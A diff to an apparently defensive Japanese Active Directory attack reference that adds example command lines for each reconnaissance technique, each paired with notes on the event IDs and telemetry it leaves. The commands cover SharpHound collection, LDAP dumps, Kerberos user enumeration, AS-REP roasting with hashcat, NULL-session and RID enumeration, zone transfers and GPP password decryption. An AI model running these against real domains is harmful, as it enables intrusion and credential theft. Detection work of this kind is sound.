@@ -12,6 +12,38 @@ AD.I18N.ja.attacks = [
     "summary": "AD/AzureADのオブジェクト・ACL・セッション・信頼関係を大量収集し、攻撃経路(Attack Path)をグラフDBで可視化する偵察ツール",
     "how": "ドメイン参加端末上で任意の認証済みユーザー権限(Authenticated Users)があれば実行可能。SharpHound.exe -c All または CollectionMethodにDCOnly/Session/LoggedOn/ACL/Trusts等を指定。DCOnlyはLDAPのみでステルス、Sessionはコンピュータへのポート445/135アクセスを伴う。出力zipをBloodHound GUIにインポートしShortest Path to Domain Admins等をクエリする。bloodhound-python(Linux)やRustHoundでリモート収集も可能。",
     "tools": "SharpHound.exe, bloodhound-python, RustHound, AzureHound, BloodHound CE/Legacy GUI, Cypher クエリ",
+    "cmd": [
+      {
+        "tool": "SharpHound",
+        "t": "全収集。`-c All` `--zipfilename` `--outputdirectory` がコマンドライン検知の主軸",
+        "q": "SharpHound.exe -c All --zipfilename loot.zip --outputdirectory C:\\Windows\\Temp"
+      },
+      {
+        "tool": "SharpHound",
+        "t": "DCへのLDAPのみに絞るステルス収集。445の扇状接続が出ないためセッション列挙ベースの検知には掛からない",
+        "q": "SharpHound.exe -c DCOnly --stealth --ldapusername svc_user --ldappassword 'Passw0rd!'"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "メモリ内実行でファイルを落とさない。4104のスクリプトブロックに `Invoke-BloodHound` が残る",
+        "q": "Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -OutputDirectory C:\\Users\\Public"
+      },
+      {
+        "tool": "bloodhound-python",
+        "t": "Linuxからのリモート収集。端末側テレメトリが無いのでDCのLDAPクエリ量と4662で見る",
+        "q": "bloodhound-python -u svc_user -p 'Passw0rd!' -d corp.local -dc dc01.corp.local -c All --zip"
+      },
+      {
+        "tool": "AzureHound",
+        "t": "Entra ID側の収集。Graph/ARMへの短時間・大量の列挙APIとして現れる",
+        "q": "azurehound -u user@corp.onmicrosoft.com -p 'Passw0rd!' list --tenant corp.onmicrosoft.com -o output.json"
+      },
+      {
+        "tool": "RustHound",
+        "t": "Rust実装の代替コレクタ。`SharpHound` の名前ベース検知を素通りする",
+        "q": "rusthound -d corp.local -u svc_user@corp.local -p 'Passw0rd!' -z"
+      }
+    ],
     "detect": "短時間での大量LDAPクエリ、全コンピュータへのSMB/RPCセッション列挙(NetSessionEnum, NetWkstaUserEnum)が特徴的シグナル。Microsoft Defender for Identity(MDI)がSharpHoundの列挙パターンを検知する。イベント4661/4662(DS Access監査)やネットワークセッション列挙の急増を相関分析する。ハニーユーザー/ハニーコンピュータへのアクセス試行も有効なカナリア。",
     "events": "4662, 4661, 5145, 4624(Type3大量), 4798, 4799",
     "mitigate": "Net Cease(NetSessionEnumの匿名アクセス制限)でセッション列挙を制限。SAMR列挙を制限するGPO(Network access: Restrict clients allowed to make remote calls to SAM)を適用。EDR/MDIによる振る舞い検知を導入し、余分なACL権限を定期棚卸ししてAttack Pathを削減する。",
@@ -52,6 +84,38 @@ AD.I18N.ja.attacks = [
     "summary": "LDAP/LDAPS(389/636/3268)でユーザー・グループ・OU・GPO・属性を直接クエリして情報収集する基本手法",
     "how": "Authenticated Users権限で(場合により匿名/NULLバインドで)DCのLDAPに接続。ldapsearch -x -H ldap://dc -b 'DC=corp,DC=local'、PowerShellの[adsisearcher]、windapsearch、ldapdomaindumpを使用。userAccountControl・servicePrincipalName・description(平文パスワード混入)・adminCount・ms-Mcs-AdmPwd(LAPS)等の属性を狙う。ページング検索で全オブジェクトをダンプ。",
     "tools": "ldapsearch, windapsearch, ldapdomaindump, ADExplorer(Sysinternals), PowerView Get-Domain*, adsisearcher",
+    "cmd": [
+      {
+        "tool": "ldapsearch",
+        "t": "LDAP経由でユーザー属性を一括取得。`-b` の検索範囲指定と多数の返り属性がDC側クエリログで目立つ",
+        "q": "ldapsearch -x -H ldap://dc01.corp.local -D \"corp\\svc_user\" -w \"Passw0rd!\" -b \"DC=corp,DC=local\" \"(objectClass=user)\" sAMAccountName description"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "`[adsisearcher]`型アクセラレータでLDAPクエリをファイルレス実行。4104のスクリプトブロックに `adsisearcher` の文字列が残る",
+        "q": "([adsisearcher]\"(&(objectCategory=person)(objectClass=user))\").FindAll()"
+      },
+      {
+        "tool": "windapsearch",
+        "t": "`--da` でDomain Adminsメンバーを再帰列挙。Python実行元からの短時間・大量LDAPバインドが特徴",
+        "q": "python3 windapsearch.py --dc-ip 10.0.0.10 -u corp.local\\svc_user -p 'Passw0rd!' --da"
+      },
+      {
+        "tool": "ldapdomaindump",
+        "t": "ユーザー/グループ/コンピュータをHTML・JSON・グレップ用に一括ダンプ。単一セッションでの全件取得が特徴",
+        "q": "ldapdomaindump -u 'corp.local\\svc_user' -p 'Passw0rd!' -o /tmp/loot dc01.corp.local"
+      },
+      {
+        "tool": "ADExplorer",
+        "t": "AD全体のスナップショットをオフライン取得。正規署名済みSysinternalsツールのため実行ブロック系の検知を回避しやすい",
+        "q": "ADExplorer64.exe -snapshot dc01.corp.local C:\\Windows\\Temp\\ad.dat"
+      },
+      {
+        "tool": "PowerView",
+        "t": "description属性に混入した平文パスワード等を狙う定番クエリ。4104に `Get-DomainUser` が残る",
+        "q": "Get-DomainUser -LDAPFilter '(description=*pass*)' -Properties samaccountname,description"
+      }
+    ],
     "detect": "単一ソースからの大量・広範囲LDAPクエリや異常な属性フィルタが検知シグナル。DC上のLDAP診断ロギング(15 Field Engineering)や、Advanced Auditing のDirectory Service Access(4662)を有効化して相関する。MDIやSIEMで短時間の全ツリーページング検索を検出する。",
     "events": "4662, 1644(LDAP診断ログ), 2889(非署名LDAPバインド)",
     "mitigate": "LDAP署名/チャネルバインディングを強制し匿名バインドを無効化。description等の属性に機密情報を格納しない運用を徹底。dsHeuristicsで匿名アクセスを無効化、機密属性へのReadアクセスをACLで制限する。",
@@ -92,6 +156,33 @@ AD.I18N.ja.attacks = [
     "summary": "servicePrincipalNameを持つサービスアカウントをLDAPで列挙し、Kerberoast可能な標的とサービス配置を特定する",
     "how": "認証済みユーザーでLDAPフィルタ (servicePrincipalName=*) をクエリするだけで実行可能。setspn -T corp -Q */*、Get-NetUser -SPN、impacketのGetUserSPNs.py、Rubeus kerberoast /stats。ネットワークスキャン不要でホスト発見(MSSQL/HTTP/CIFS等のSPNからサービス配置を推定)とKerberoast候補選定を同時に行うステルス手法。",
     "tools": "setspn.exe, PowerView Get-NetUser/Get-NetComputer -SPN, GetUserSPNs.py(impacket), Rubeus",
+    "cmd": [
+      {
+        "tool": "setspn.exe",
+        "t": "OS標準LOLBinでSPN保有アカウントを一括照会。`-Q */*` は正規運用とも重なるため直後のTGS要求と相関させる",
+        "q": "setspn.exe -T corp.local -Q */*"
+      },
+      {
+        "tool": "PowerView",
+        "t": "servicePrincipalNameが空でないユーザーのみ抽出。4104に `Get-DomainUser` と `-SPN` が残る",
+        "q": "Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "TGS要求を伴わずSPN一覧だけを集計。`kerberoast /stats` はKerberoast実行前の下見として使われる",
+        "q": "Rubeus.exe kerberoast /stats"
+      },
+      {
+        "tool": "Impacket",
+        "t": "`-request` を付けずSPN一覧のみ取得。Linux側実行のためDCには通常LDAP検索ログのみが残る",
+        "q": "GetUserSPNs.py corp.local/svc_user:'Passw0rd!' -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "ldapsearch",
+        "t": "LDAPフィルタ `(servicePrincipalName=*)` のみで完結する最も低ノイズな手法",
+        "q": "ldapsearch -x -H ldap://dc01.corp.local -b \"DC=corp,DC=local\" \"(servicePrincipalName=*)\" servicePrincipalName sAMAccountName"
+      }
+    ],
     "detect": "SPN属性への集中的なLDAPクエリはKerberoast準備の兆候。単体では正常トラフィックと区別しにくいため、直後のTGS-REQ(4769, RC4暗号化要求)との相関で検知する。honey SPN(使われないダミーSPNを付与したデコイアカウント)へのアクセスを監視するのが有効。",
     "events": "4662, 4769(後続のKerberoastで)",
     "mitigate": "サービスアカウントをgMSA(グループ管理サービスアカウント)化しSPNを人間管理アカウントから排除。強力なパスワード(25文字以上)とAES暗号化強制でKerberoast耐性を高める。honey SPNアカウントをデコイとして配置する。",
@@ -127,6 +218,28 @@ AD.I18N.ja.attacks = [
     "summary": "KDCのAS-REQ応答(KDC_ERR_PREAUTH_REQUIRED vs PRINCIPAL_UNKNOWN)の差異から有効なユーザー名を認証なしで列挙する",
     "how": "事前認証不要。ポート88へAS-REQを送り、存在するユーザーはKDC_ERR_PREAUTH_REQUIRED(25 / 0x19)、存在しないユーザーはKDC_ERR_C_PRINCIPAL_UNKNOWN(6 / 0x6)を返す差異を利用（24/0x18はKDC_ERR_PREAUTH_FAILED=パスワード誤りで別物）。kerbrute userenum -d corp.local userlist.txt、Rubeus、nmap krb5-enum-usersを使用。アカウントロックアウトを起こさずユーザー名を大量検証できる(パスワード試行を伴わないため)。",
     "tools": "kerbrute, Rubeus, nmap(krb5-enum-users), impacket",
+    "cmd": [
+      {
+        "tool": "kerbrute",
+        "t": "AS-REQを送りKDC応答差異(`PREAUTH_REQUIRED`/`PRINCIPAL_UNKNOWN`)でユーザー存在を判定。88/udpへの高頻度AS-REQが特徴",
+        "q": "kerbrute userenum -d corp.local --dc dc01.corp.local userlist.txt -o valid_users.txt"
+      },
+      {
+        "tool": "nmap",
+        "t": "NSEスクリプトでKerberos事前認証プロービングを自動化。`krb5-enum-users.realm` 引数が特徴的",
+        "q": "nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='corp.local',userdb=userlist.txt dc01.corp.local"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "同様のAS-REQ差異を利用したユーザー列挙・パスワードスプレー機能。`brute` サブコマンドがコマンドラインに残る",
+        "q": "Rubeus.exe brute /users:userlist.txt /domain:corp.local /dc:dc01.corp.local"
+      },
+      {
+        "tool": "Impacket",
+        "t": "本来AS-REPロースト用だが `-usersfile`+`-no-pass` の応答差(存在しないユーザー vs 要事前認証ユーザー)が列挙に流用される",
+        "q": "GetNPUsers.py -no-pass -usersfile userlist.txt corp.local/"
+      }
+    ],
     "detect": "短時間に多数の異なるプリンシパルへ送られるAS-REQ(4768)の急増がシグナル。ただし有効かつ正常なアカウントはKDCがKDC_ERR_PREAUTH_REQUIRED(0x19)を返しても4768を記録しないことが多く、確実にログ化されるのは非存在(結果コード0x6=KDC_ERR_C_PRINCIPAL_UNKNOWN)および無効/ロックアウト/期限切れアカウントである。したがって信頼できる検知は「単一ソースIPから短時間に結果コード0x6が多数」であり、0x19イベントの有無には依存させない。MDIの`Account enumeration reconnaissance`(Kerberosベースのアカウント列挙)アラートで補完する。パスワード試行を伴わないためロックアウトは起きず、失敗ログオン量では検知できない点にも留意する。",
     "events": "4768(結果コード 0x6=非存在 / 0x19=存在・要事前認証), 4771",
     "mitigate": "ユーザー名列挙自体はKerberosプロトコル上防ぎきれないため、検知・レート制限を主体とする。認証プロキシ/ファイアウォールでKDC(88)への外部アクセスを遮断し、単一ソースからの4768(結果コード0x6/0x19)の大量発生にアラートを設定。推測されにくい命名規則を採用し、ハニーアカウントで列挙を検知する。(事前認証の有効化はAS-REP Roast対策であり、この列挙自体は防げない点に注意)",
@@ -162,6 +275,28 @@ AD.I18N.ja.attacks = [
     "summary": "Kerberos事前認証が無効(DONT_REQ_PREAUTH)なアカウントをLDAPで列挙し、オフライン解読可能なAS-REPを取得する",
     "how": "LDAPで userAccountControl:1.2.840.113556.1.4.803:=4194304 (DONT_REQ_PREAUTH) を持つアカウントを列挙。認証不要でGetNPUsers.py -no-pass、Rubeus asreproast によりAS-REPの暗号化部分(ユーザーの長期鍵=パスワード由来鍵で暗号化されたenc-part)を取得しhashcat(-m 18200)でオフライン解読(AS-REP内のTGT自体はkrbtgt鍵で暗号化され解読対象ではない)。ユーザー名リストがあれば認証情報なしでも実行可能。",
     "tools": "GetNPUsers.py(impacket), Rubeus asreproast, hashcat -m 18200",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "DONT_REQ_PREAUTHアカウントのAS-REPを取得。`-request` と `-format hashcat` の組み合わせが典型",
+        "q": "GetNPUsers.py corp.local/ -no-pass -usersfile userlist.txt -request -format hashcat -outputfile asrep_hashes.txt"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "LDAPで対象を自動検出し一括取得。`asreproast` と `/format:hashcat` が残りやすい文字列",
+        "q": "Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "特定ユーザーのみ狙う低ノイズ版。BloodHound等の事前調査で選定した高権限アカウントに絞る",
+        "q": "Rubeus.exe asreproast /user:svc_legacy /nowrap"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "持ち出し後のオフライン解読。モード18200=AS-REP、出現自体がAS-REPロースト成立の裏付け",
+        "q": "hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt"
+      }
+    ],
     "detect": "DONT_REQ_PREAUTH属性を持つアカウントへのAS-REQ(4768)や、pre-auth無効属性のLDAP検索が兆候。通常業務にないアカウントで事前認証なしのTGT発行が起きたら要調査。RC4暗号化(etype 0x17)のチケット要求を監視する。",
     "events": "4768(pre-auth type 0), 4662",
     "mitigate": "全アカウントで事前認証を必須化しDONT_REQ_PREAUTHフラグを排除(定期監査)。やむを得ず無効なアカウントは強力なパスワードとAES暗号化を強制。honeypotアカウントに同フラグを付けデコイ検知する。",
@@ -197,6 +332,33 @@ AD.I18N.ja.attacks = [
     "summary": "認証情報なしでIPC$共有やSAMR/LSARPCに接続し、ユーザー・グループ・共有・ドメインポリシーを列挙する",
     "how": "net use \\\\target\\IPC$ '' /u:'' でnullバインドし、rpcclient -U '' -N target で enumdomusers/enumdomgroups/querydominfo/lsaenumsid を実行。enum4linux-ng -a target で自動一括列挙。古い設定(RestrictAnonymous=0)やレガシーホスト、一部のNAS/プリンタで匿名列挙が成立する。SMB共有列挙(smbclient -L -N)も含む。",
     "tools": "rpcclient, enum4linux(-ng), smbclient, nmap smb-enum-*, NetExec -u '' -p ''",
+    "cmd": [
+      {
+        "tool": "net.exe",
+        "t": "IPC$へ空認証で接続するOS標準コマンド。`/u:\"\"` の空ユーザー指定が正規運用では稀な組み合わせ",
+        "q": "net use \\\\dc01.corp.local\\IPC$ \"\" /u:\"\""
+      },
+      {
+        "tool": "rpcclient",
+        "t": "SAMR/LSARPC経由でユーザー・グループを列挙。`-U \"\" -N` のNULLバインドが決定的シグナル",
+        "q": "rpcclient -U \"\" -N dc01.corp.local -c \"enumdomusers;enumdomgroups;querydominfo\""
+      },
+      {
+        "tool": "enum4linux-ng",
+        "t": "匿名列挙を自動一括実行。`-A` は共有・ユーザー・グループ・ポリシーを網羅し短時間に多数のRPC呼び出しが集中",
+        "q": "enum4linux-ng -A dc01.corp.local -oJ enum_output"
+      },
+      {
+        "tool": "smbclient",
+        "t": "SMB共有一覧を匿名列挙。`-L -N` は正規のブラウジングでは稀な組み合わせ",
+        "q": "smbclient -L //dc01.corp.local -N"
+      },
+      {
+        "tool": "NetExec",
+        "t": "空認証でSMBログオンを試行しつつユーザー列挙。失敗ログオンにならず4624/Type3で成立することがある",
+        "q": "netexec smb dc01.corp.local -u '' -p '' --users"
+      }
+    ],
     "detect": "匿名(NULL)認証によるSMB/IPC$アクセスや、rpcclientのSAMR/LSARPC呼び出しが検知対象。イベント5140/5145(共有アクセス)でユーザーが匿名(ANONYMOUS LOGON)のもの、4624 Type3のANONYMOUS LOGONを監視する。",
     "events": "5140, 5145, 4624(ANONYMOUS LOGON)",
     "mitigate": "RestrictAnonymousSAM=1(RestrictAnonymous=2はWin2000世代のみ有効)、Network access: Do not allow anonymous enumeration of SAM accounts and sharesを有効化。SMBv1を無効化しレガシー匿名アクセスを遮断。ファイアウォールで445/139を内部限定にする。",
@@ -237,6 +399,28 @@ AD.I18N.ja.attacks = [
     "summary": "既知ドメインSIDにRID(500,512,1000...)を順次付加してLSARPCで名前解決し、全アカウントを列挙する",
     "how": "ドメインSID(例 S-1-5-21-...)を取得後、RIDを500から連番でLookupSids/LookupNamesにより名前解決。lookupsid.py corp/user:pass@target 20000、rpcclient の lookupsids、enum4linusing -r、NetExec --rid-brute を使用。匿名または低権限アカウントで、SAMR列挙が制限されていてもLSARPC経由で回避できる場合がある。",
     "tools": "lookupsid.py(impacket), rpcclient(lookupsids), NetExec --rid-brute, enum4linux -r",
+    "cmd": [
+      {
+        "tool": "NetExec",
+        "t": "既知SIDにRIDを連番付加し名前解決。`--rid-brute` はSAMR制限下でもLSARPC経由で回避できることがある",
+        "q": "netexec smb dc01.corp.local -u '' -p '' --rid-brute 10000"
+      },
+      {
+        "tool": "Impacket",
+        "t": "RID 0から指定maxRidまで連番でLookupSidsを実行。短時間の大量LSARPC呼び出しが特徴",
+        "q": "lookupsid.py corp.local/svc_user:'Passw0rd!'@10.0.0.10 20000"
+      },
+      {
+        "tool": "rpcclient",
+        "t": "手動でSIDにRIDを付加しlookupsidsを反復実行。同一セッションでの大量呼び出しになる",
+        "q": "rpcclient -U \"\" -N dc01.corp.local -c \"lookupsids S-1-5-21-1111111111-2222222222-3333333333-1000\""
+      },
+      {
+        "tool": "enum4linux",
+        "t": "`-r` でRIDサイクリングを自動実行。SAMR拒否時もLSARPC経由での列挙を試みる",
+        "q": "enum4linux -r -u '' -p '' dc01.corp.local"
+      }
+    ],
     "detect": "連続するRIDに対する大量のSID<->名前解決要求(LSARPC LsarLookupSids)が明確なシグナル。短時間の逐次的な名前解決や、単一セッションでの多数SIDルックアップを検出する。MDIがreconnaissance using account enumerationとして警告する。",
     "events": "4661, 4662, 5145(lsarpc/samr パイプアクセス)",
     "mitigate": "Restrict clients allowed to make remote calls to SAM(SAMRアクセス制限)を管理者限定に設定。匿名アクセスの無効化とLSARPCへのアクセス制御。異常なSIDルックアップ量にアラートを設定する。",
@@ -277,6 +461,33 @@ AD.I18N.ja.attacks = [
     "summary": "AD構成・脆弱性・委任・信頼・GPOを網羅的に自動収集しレポート化する監査/偵察ツール群",
     "how": "認証済みユーザーで実行。PingCastle --healthcheck はLDAP/SMB/RPCでドメイン全体の脆弱性スコアを算出。ADRecon.ps1 はExcelレポート生成。PowerView(Get-DomainUser/Get-NetGPO/Find-InterestingDomainAcl/Invoke-ACLScanner)でACLや委任を探索。攻撃者は防御側監査ツールを流用して弱点(脆弱な委任・古いパスワード・信頼)を素早く把握する。",
     "tools": "PingCastle, ADRecon, PowerView(PowerSploit), Purple Knight, Group3r, SharpView",
+    "cmd": [
+      {
+        "tool": "PingCastle",
+        "t": "LDAP/SMB/RPCでドメイン全体を短時間に走査しスコア化。`--healthcheck --server` は正規監査とも重なるため実行元アカウントで判断",
+        "q": "PingCastle.exe --healthcheck --server dc01.corp.local"
+      },
+      {
+        "tool": "ADRecon",
+        "t": "ADWS/LDAPで委任・パスワードポリシー・GPO等を網羅収集しレポート化。`-Collect` `-OutputType` が特徴的な文字列",
+        "q": ".\\ADRecon.ps1 -DomainController dc01.corp.local -Credential corp\\svc_user -Collect Default -OutputType Excel"
+      },
+      {
+        "tool": "PowerView",
+        "t": "書き込み可能ACLを持つオブジェクトを探索。`Find-InterestingDomainAcl` は4104スクリプトブロックに残る特徴的な関数名",
+        "q": "Find-InterestingDomainAcl -ResolveGUIDs | Export-Csv -NoTypeInformation acls.csv"
+      },
+      {
+        "tool": "Group3r",
+        "t": "SYSVOL上のGPOを解析し危険設定を検出。`-w -a 4` で高深刻度所見のみに絞る組み合わせが典型",
+        "q": "Group3r.exe -w -a 4"
+      },
+      {
+        "tool": "Purple Knight",
+        "t": "GUIウィザード形式でコマンドライン引数をほぼ持たない。プロセス作成イベントでの実行自体が唯一の手掛かり",
+        "q": "PurpleKnight.exe"
+      }
+    ],
     "detect": "PingCastle等は大量のLDAP/SMB/RPCクエリを短時間に発行するためベースラインからの逸脱として検知可能。PowerViewのAMSI/スクリプトブロックロギング(4104)や、既知ツールのシグネチャをEDRで検出する。承認された監査以外での実行を監視する。",
     "events": "4104(PowerShellスクリプトブロック), 4662, 5145",
     "mitigate": "PowerShell Constrained Language ModeとAMSIを有効化しPowerViewの実行を阻害。防御側は正規にこれらツールで自己監査し弱点を先に潰す(委任見直し・LAPS導入)。EDRでスクリプトベース偵察をブロックする。",
@@ -312,6 +523,33 @@ AD.I18N.ja.attacks = [
     "summary": "AD統合DNSゾーンからホスト・SRVレコードを収集し内部ネットワークとサービス配置(DC/GC/Kerberos)を把握する",
     "how": "SRVレコード(_ldap._tcp.dc._msdcs, _kerberos._tcp, _gc._tcp)問い合わせでDC/GC/KDCを特定。ゾーン転送(dig axfr corp.local @dc)が許可されていれば全レコード取得。AD統合DNSは認証済みユーザーがLDAP(CN=MicrosoftDNS)経由やadidnsdump(NetExec)で列挙可能。DNS動的更新の悪用でレコード注入も。dnsrecon/dnsenumも使用。",
     "tools": "dig/nslookup(axfr), dnsrecon, dnsenum, adidnsdump, dnscmd, nmap dns-srv-enum",
+    "cmd": [
+      {
+        "tool": "dig",
+        "t": "ゾーン転送が許可されていれば全レコードを一括取得。`axfr` は即座に異常なDNSクエリタイプとして識別できる",
+        "q": "dig axfr corp.local @dc01.corp.local"
+      },
+      {
+        "tool": "dnsrecon",
+        "t": "SRVレコード列挙とゾーン転送試行を自動化。`-t axfr` で全NSサーバに転送試行し設定不備を突く",
+        "q": "dnsrecon -d corp.local -t axfr"
+      },
+      {
+        "tool": "adidnsdump",
+        "t": "認証済みユーザーがLDAP経由でAD統合DNSゾーンを丸ごとダンプ。ゾーン転送を使わずCN=MicrosoftDNS配下を直接読む",
+        "q": "adidnsdump -u 'corp.local\\svc_user' -p 'Passw0rd!' -r ldap://dc01.corp.local"
+      },
+      {
+        "tool": "nslookup",
+        "t": "DC/GC/KDCの配置を把握する定番の下見。SRVクエリはドメイン参加端末の正規動作とも重なり単体では低忠実度",
+        "q": "nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local"
+      },
+      {
+        "tool": "dnsenum",
+        "t": "ゾーン転送試行とサブドメイン列挙を一括実行。`-f` のワードリスト総当りは大量のDNSクエリとして現れる",
+        "q": "dnsenum --noreverse -f subdomains.txt corp.local"
+      }
+    ],
     "detect": "ゾーン転送(AXFR)要求や、SRV/大量レコードへの網羅的問い合わせが兆候。DNS監査ログ(Analytical/Debugログ)でAXFRの発生源や異常なクエリ量を監視する。許可されていないIPからのゾーン転送試行を検出する。",
     "events": "DNS Server Analyticalログ(AXFR), 6001(DNS)",
     "mitigate": "ゾーン転送を許可済みセカンダリDNSのみに制限(またはAD統合で無効化)。DNS動的更新をセキュア(認証済み)のみに設定。ADIDNSのACLを見直し、内部DNSを外部公開しない。",
@@ -352,6 +590,33 @@ AD.I18N.ja.attacks = [
     "summary": "GPOとSYSVOL(gpttmpl.inf/groups.xml等)を列挙し委任設定・スケジュールタスク・GPP平文パスワードを収集する",
     "how": "認証済みユーザーはSYSVOL(\\\\corp.local\\SYSVOL)を読み取り可。Get-GPO -All、PowerView Get-NetGPO/Get-GPOLocation、Group3rでGPO内の危険設定を探索。特にGroups.xml等のGPP cpasswordはAES固定鍵で復号可能(gpp-decrypt)。GPOのリンク先OUと適用対象からアクセス制御と特権配布を把握し、書き込み可能GPOをGPO Abuseの標的にする。",
     "tools": "PowerView Get-NetGPO, Get-GPO(GroupPolicy), Group3r, SharpGPOAbuse(偵察), gpp-decrypt, Snaffler",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "GPOオブジェクトとリンク先OUを列挙。4104スクリプトブロックに `Get-DomainGPO` が残る",
+        "q": "Get-DomainGPO -Properties displayname,gpcfilesyspath | Export-Csv -NoTypeInformation gpos.csv"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "正規のGPO管理コマンドレットを流用した列挙。RSAT導入端末でのみ利用可能なため実行元ホストを絞り込める",
+        "q": "Get-GPO -All | Select-Object DisplayName,Id"
+      },
+      {
+        "tool": "gpp-decrypt",
+        "t": "SYSVOL上のGroups.xml等からcpasswordを抽出しAES固定鍵で復号。復号処理自体がGPP平文パスワード窃取の決定的シグナル",
+        "q": "gpp-decrypt -f \\\\corp.local\\SYSVOL\\corp.local\\Policies\\{GUID}\\MACHINE\\Preferences\\Groups\\Groups.xml"
+      },
+      {
+        "tool": "Group3r",
+        "t": "GPO内の危険設定(スタートアップスクリプト・権限委任等)を自動検出。`-a 4` は高深刻度のみに絞る典型的な組み合わせ",
+        "q": "Group3r.exe -w -a 4"
+      },
+      {
+        "tool": "Snaffler",
+        "t": "GPO列挙後にSYSVOLや書き込み可能共有内の機密ファイルを探索。`-s` の共有列挙は445への広範囲アクセスとして現れる",
+        "q": "Snaffler.exe -s -d corp.local -c dc01.corp.local -o snaffler_out.log"
+      }
+    ],
     "detect": "SYSVOL上のXML/INFファイルへの大量読み取りアクセスや、GPOオブジェクトへのLDAP列挙が兆候。SYSVOL共有アクセス(5145)の異常や、Groups.xml等へのアクセスを監視する。GPP cpassword残存の有無を定期スキャンする。",
     "events": "5145(SYSVOLアクセス), 4662(GPOオブジェクト), 5136(GPO変更)",
     "mitigate": "MS14-025適用済み環境でもSYSVOL内の既存GPP cpasswordを全削除。GPOの委任(Write/Edit権限)を最小化しTier分離。Snaffler等でSYSVOLの機密情報を先行スキャンし除去、GPO変更監査を有効化する。",
@@ -387,6 +652,28 @@ AD.I18N.ja.attacks = [
     "summary": "ドメイン/フォレスト間の信頼関係と方向・種別(推移/外部/フォレスト)を列挙し横展開・特権昇格経路を把握する",
     "how": "nltest /domain_trusts /all_trusts、Get-NetDomainTrust(PowerView)、Get-ADTrust、SharpHoundのTrustsコレクションで信頼を列挙。信頼方向・SIDフィルタリング有無・推移性を確認しSID History悪用やクロスフォレストKerberoast、信頼キー(trust key)による黄金/銀チケット横展開の下準備とする。",
     "tools": "nltest, PowerView Get-NetDomainTrust, Get-ADTrust, SharpHound(Trusts), BloodHound",
+    "cmd": [
+      {
+        "tool": "nltest",
+        "t": "OS標準LOLBinで信頼関係を列挙。`/domain_trusts /all_trusts` は正規運用でも使われ単体では低忠実度",
+        "q": "nltest /domain_trusts /all_trusts /v"
+      },
+      {
+        "tool": "PowerView",
+        "t": "信頼方向・種別をPowerShellで取得。4104に `Get-DomainTrust` が残りSID History悪用の下調べに使われる",
+        "q": "Get-DomainTrust -Domain corp.local"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "正規署名済みRSATモジュールでの列挙。実行ファイル検知は効かず4104のコマンドレット名のみが手掛かり",
+        "q": "Get-ADTrust -Filter *"
+      },
+      {
+        "tool": "SharpHound",
+        "t": "Trustsコレクションのみに絞った軽量収集。他コレクション種別よりLDAP呼び出しが少なくノイズが小さい",
+        "q": "SharpHound.exe -c Trusts --outputdirectory C:\\Windows\\Temp"
+      }
+    ],
     "detect": "信頼オブジェクト(trustedDomain)へのLDAPクエリやnltestの実行が兆候。単一ホストからのドメイン信頼列挙の集中や、通常運用外での信頼列挙をEDR/MDIで検知する。",
     "events": "4662(trustedDomainオブジェクト), 4104",
     "mitigate": "不要な信頼を削除し、残す信頼はSIDフィルタリング(Quarantine)と選択的認証を有効化。フォレスト境界をセキュリティ境界として設計しTier分離。信頼構成を定期監査する。",
@@ -422,6 +709,33 @@ AD.I18N.ja.attacks = [
     "summary": "ネットワーク共有・アクティブセッション・ログオンユーザーを列挙し、機密ファイルと特権ユーザーの所在を特定する",
     "how": "PowerViewのInvoke-ShareFinder/Find-DomainShare で読み取り可能共有を発見、Get-NetSession/Invoke-UserHunter で特権ユーザーがログオンしているホストを特定(NetSessionEnum/NetWkstaUserEnumはデフォルト低権限で列挙可)。Snafflerで共有内のパスワード・鍵ファイルを自動探索。SharpHoundのSession収集も同原理。",
     "tools": "PowerView(ShareFinder/UserHunter), Snaffler, NetExec --shares/--sessions/--loggedon-users, NetExec",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "読み取り可能な共有をドメイン全域で探索。NetShareEnum呼び出しが5140の共有アクセスイベントとして大量発生する",
+        "q": "Invoke-ShareFinder -Verbose"
+      },
+      {
+        "tool": "PowerView",
+        "t": "特定ホストのアクティブセッションを列挙。NetSessionEnum(SrvSvc)は低権限でも成立し正規運用の共有アクセスと紛れやすい",
+        "q": "Get-NetSession -ComputerName fileserver01.corp.local"
+      },
+      {
+        "tool": "PowerView",
+        "t": "Domain Adminsのログオン先ホストを特定。`-Stealth`はファイルサーバ等主要ホストに絞り445への扇状接続を抑える",
+        "q": "Invoke-UserHunter -GroupName 'Domain Admins' -Stealth"
+      },
+      {
+        "tool": "Snaffler",
+        "t": "共有内のパスワードファイルや鍵を自動探索。`-o`ログに大量のUNCパスと読み取りアクセスが残り高頻度アクセスとして検知できる",
+        "q": "Snaffler.exe -s -o snaffler_corp.log -d corp.local -v Data"
+      },
+      {
+        "tool": "NetExec",
+        "t": "共有・セッション・ログオン中ユーザーを1コマンドで一括収集。認証後にTreeConnectと列挙APIが連続するため相関で検知しやすい",
+        "q": "nxc smb 10.0.0.0/24 -u svc_user -p 'Passw0rd!' --shares --sessions --loggedon-users"
+      }
+    ],
     "detect": "多数ホストへのNetSessionEnum/NetWkstaUserEnum RPC呼び出しや広範なSMB共有アクセスがシグナル。短時間での大量445接続、共有ツリー接続(5140)の急増を監視する。UserHunterによる特権ユーザー探索はハニーユーザーで検知可能。",
     "events": "5140, 5145, 4624(Type3多発)",
     "mitigate": "Net Cease(NetSessionEnumの匿名/一般ユーザーアクセス制限)を適用。共有ACLを最小化し機密ファイルを共有に置かない。SMB署名の強制とSnaffler型スキャンのEDR検知を導入する。",
@@ -462,6 +776,33 @@ AD.I18N.ja.attacks = [
